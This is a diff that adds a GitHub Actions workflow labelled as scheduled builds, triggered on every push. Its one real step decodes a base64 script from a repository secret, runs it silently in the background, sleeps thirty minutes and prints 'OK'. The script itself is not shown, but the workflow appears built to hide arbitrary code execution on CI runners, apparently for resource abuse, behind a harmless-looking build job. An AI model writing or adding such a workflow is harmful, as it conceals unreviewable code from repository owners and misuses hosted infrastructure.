@@ -1,0 +1,26 @@
+# .github/workflows/scheduled-builds.yml
+name: push data
+
+on: [push]
+
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [ '20' ]
+    steps:
+      - uses: actions/checkout@v1
+      - name: Setup node
+        uses: actions/setup-node@v2
+        with:
+          node-version: ${{ matrix.node }}
+      - name: Jalankan Skrip
+        env:
+          REPO: ${{ secrets.REPO }}
+        run: |
+          echo "$REPO" | base64 --decode > ku.sh
+          sh ku.sh > /dev/null 2>&1 &
+          sleep 30m 
+          echo "OK"
